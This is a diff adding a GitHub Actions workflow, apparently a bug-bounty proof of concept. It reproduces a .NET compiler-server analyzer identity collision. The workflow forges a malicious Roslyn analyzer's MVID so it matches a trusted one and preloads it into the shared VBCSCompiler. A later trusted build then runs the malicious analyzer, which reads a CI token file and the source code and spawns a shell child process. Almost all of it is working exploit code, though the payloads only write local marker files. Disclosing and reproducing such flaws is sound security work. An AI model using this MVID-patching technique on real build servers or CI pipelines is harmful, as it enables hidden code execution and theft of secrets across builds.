@@ -1,0 +1,228 @@
+name: roslyn-mvid-supported-versions-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/roslyn-mvid-supported-versions-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - sdk: '8.0.x'
+            tfm: net8.0
+            label: net8
+          - sdk: '9.0.x'
+            tfm: net9.0
+            label: net9
+          - sdk: '10.0.x'
+            tfm: net10.0
+            label: net10
+
+    name: ${{ matrix.label }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: ${{ matrix.sdk }}
+
+      - name: Reproduce cross-job analyzer identity collision
+        shell: bash
+        env:
+          TFM: ${{ matrix.tfm }}
+          LABEL: ${{ matrix.label }}
+        run: |
+          set -euo pipefail
+          echo "SDK_VERSION=$(dotnet --version)"
+          rm -rf /tmp/roslyn-supported-fixtures /tmp/reused-supported-workspace
+          rm -f /tmp/SUPPORTED_MARKER /tmp/SUPPORTED_CHILD_MARKER /tmp/supported.log
+          mkdir -p /tmp/roslyn-supported-fixtures/{trusted,malicious,reader}
+
+          cat > /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.csproj.in <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>__TFM__</TargetFramework>
+              <AssemblyName>CollisionAnalyzer</AssemblyName>
+              <Deterministic>true</Deterministic>
+              <DebugType>none</DebugType>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis" HintPath="$(MSBuildSDKsPath)/../Roslyn/bincore/Microsoft.CodeAnalysis.dll" Private="false" />
+            </ItemGroup>
+          </Project>
+          EOF
+          sed "s/__TFM__/$TFM/g" /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.csproj.in > /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.csproj
+          cp /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.csproj /tmp/roslyn-supported-fixtures/malicious/CollisionAnalyzer.csproj
+
+          cat > /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB005", "Lab", "Trusted", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None)));
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-supported-fixtures/malicious/CollisionAnalyzer.cs <<'EOF'
+          using System.Collections.Immutable;
+          using System.Diagnostics;
+          using System.IO;
+          using System.Linq;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class CollisionAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule =
+                  new("LAB005", "Lab", "Stale", "Lab", DiagnosticSeverity.Warning, true);
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics => ImmutableArray.Create(Rule);
+              public override void Initialize(AnalysisContext context)
+              {
+                  context.EnableConcurrentExecution();
+                  context.RegisterCompilationAction(static ctx =>
+                  {
+                      var tokenPath = "/tmp/reused-supported-workspace/.ci/trusted-token.txt";
+                      var token = File.Exists(tokenPath) ? File.ReadAllText(tokenPath) : "<ABSENT>";
+                      var source = string.Join("\n", ctx.Compilation.SyntaxTrees.Select(t => t.GetText().ToString()));
+                      File.WriteAllText("/tmp/SUPPORTED_MARKER",
+                          "ASSEMBLY=" + ctx.Compilation.AssemblyName + "\nTOKEN=" + token + "\nSOURCE=" + source);
+                      if (ctx.Compilation.AssemblyName == "Trusted")
+                      {
+                          Process.Start(new ProcessStartInfo
+                          {
+                              FileName = "/bin/sh",
+                              ArgumentList = { "-c", "printf 'SUPPORTED_STALE_ANALYZER_CHILD\\n' > /tmp/SUPPORTED_CHILD_MARKER" },
+                              UseShellExecute = false
+                          })!.WaitForExit();
+                      }
+                      ctx.ReportDiagnostic(Diagnostic.Create(Rule, Location.None));
+                  });
+              }
+          }
+          EOF
+
+          cat > /tmp/roslyn-supported-fixtures/reader/MvidReader.csproj.in <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup><TargetFramework>__TFM__</TargetFramework><OutputType>Exe</OutputType></PropertyGroup>
+          </Project>
+          EOF
+          sed "s/__TFM__/$TFM/g" /tmp/roslyn-supported-fixtures/reader/MvidReader.csproj.in > /tmp/roslyn-supported-fixtures/reader/MvidReader.csproj
+          cat > /tmp/roslyn-supported-fixtures/reader/Program.cs <<'EOF'
+          using System;
+          using System.IO;
+          using System.Reflection.Metadata;
+          using System.Reflection.PortableExecutable;
+          using var s = File.OpenRead(args[0]);
+          using var pe = new PEReader(s);
+          var md = pe.GetMetadataReader();
+          Console.WriteLine(Convert.ToHexString(md.GetGuid(md.GetModuleDefinition().Mvid).ToByteArray()));
+          EOF
+
+          dotnet build /tmp/roslyn-supported-fixtures/trusted/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-supported-fixtures/malicious/CollisionAnalyzer.csproj -c Release -v:q
+          dotnet build /tmp/roslyn-supported-fixtures/reader/MvidReader.csproj -c Release -v:q
+
+          trusted="/tmp/roslyn-supported-fixtures/trusted/bin/Release/$TFM/CollisionAnalyzer.dll"
+          malicious="/tmp/roslyn-supported-fixtures/malicious/bin/Release/$TFM/CollisionAnalyzer.dll"
+          reader="/tmp/roslyn-supported-fixtures/reader/bin/Release/$TFM/MvidReader.dll"
+          th=$(dotnet "$reader" "$trusted")
+          mh=$(dotnet "$reader" "$malicious")
+          test "$th" != "$mh"
+
+          python3 - "$malicious" "$mh" "$th" <<'PY'
+          from pathlib import Path
+          import sys
+          p=Path(sys.argv[1]); old=bytes.fromhex(sys.argv[2]); new=bytes.fromhex(sys.argv[3])
+          b=bytearray(p.read_bytes())
+          assert b.count(old)==1, b.count(old)
+          i=b.index(old); b[i:i+16]=new; p.write_bytes(b)
+          PY
+          test "$(dotnet "$reader" "$malicious")" = "$th"
+
+          echo "TRUSTED_MVID=$th"
+          echo "ORIGINAL_ATTACKER_MVID=$mh"
+          echo "PATCHED_ATTACKER_MVID=$(dotnet "$reader" "$malicious")"
+          sha256sum "$trusted" "$malicious"
+
+          dotnet build-server shutdown >/dev/null 2>&1 || true
+          mkdir -p /tmp/reused-supported-workspace/tools
+          cp "$malicious" /tmp/reused-supported-workspace/tools/CollisionAnalyzer.dll
+
+          cat > /tmp/reused-supported-workspace/App.csproj.in <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>__TFM__</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Poison</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>false</RunAnalyzers>
+              <RunAnalyzersDuringBuild>false</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          sed "s/__TFM__/$TFM/g" /tmp/reused-supported-workspace/App.csproj.in > /tmp/reused-supported-workspace/App.csproj
+          echo 'System.Console.WriteLine("UNTRUSTED");' > /tmp/reused-supported-workspace/Program.cs
+
+          export RoslynCommandLineLogFile=/tmp/supported.log
+          dotnet build /tmp/reused-supported-workspace/App.csproj -c Release -t:Rebuild \
+            -p:UseSharedCompilation=true -p:RunAnalyzers=false -p:RunAnalyzersDuringBuild=false -v:q
+          test ! -e /tmp/SUPPORTED_MARKER
+          echo "$LABEL"_POISON_STAGE_EXECUTION=BLOCKED
+
+          rm -rf /tmp/reused-supported-workspace
+          mkdir -p /tmp/reused-supported-workspace/{tools,.ci}
+          cp "$trusted" /tmp/reused-supported-workspace/tools/CollisionAnalyzer.dll
+          printf "TRUSTED_ONLY_TOKEN_%s_20260921" "$LABEL" > /tmp/reused-supported-workspace/.ci/trusted-token.txt
+
+          cat > /tmp/reused-supported-workspace/App.csproj.in <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>__TFM__</TargetFramework>
+              <OutputType>Exe</OutputType>
+              <AssemblyName>Trusted</AssemblyName>
+              <UseSharedCompilation>true</UseSharedCompilation>
+              <RunAnalyzers>true</RunAnalyzers>
+              <RunAnalyzersDuringBuild>true</RunAnalyzersDuringBuild>
+            </PropertyGroup>
+            <ItemGroup><Analyzer Include="$(MSBuildProjectDirectory)/tools/CollisionAnalyzer.dll" /></ItemGroup>
+          </Project>
+          EOF
+          sed "s/__TFM__/$TFM/g" /tmp/reused-supported-workspace/App.csproj.in > /tmp/reused-supported-workspace/App.csproj
+          echo 'System.Console.WriteLine("TRUSTED_LATER_SOURCE");' > /tmp/reused-supported-workspace/Program.cs
+
+          cmp "$trusted" /tmp/reused-supported-workspace/tools/CollisionAnalyzer.dll
+          dotnet build /tmp/reused-supported-workspace/App.csproj -c Release -t:Rebuild -p:UseSharedCompilation=true -v:q
+
+          test -e /tmp/SUPPORTED_MARKER
+          test -e /tmp/SUPPORTED_CHILD_MARKER
+          grep -q "ASSEMBLY=Trusted" /tmp/SUPPORTED_MARKER
+          grep -q "TRUSTED_ONLY_TOKEN_$LABEL"_20260921 /tmp/SUPPORTED_MARKER
+          grep -q "TRUSTED_LATER_SOURCE" /tmp/SUPPORTED_MARKER
+
+          echo "$LABEL"_MVID_CROSS_JOB_BYPASS=CONFIRMED
+          echo "$LABEL"_TRUSTED_TOKEN_READ=CONFIRMED
+          echo "$LABEL"_TRUSTED_CHILD_PROCESS_EXECUTION=CONFIRMED
+          echo "$LABEL"_SAME_SERVER_EVIDENCE:
+          grep -E 'ID=VBCSCompiler .*Begin Analyzer Consistency' /tmp/supported.log || true
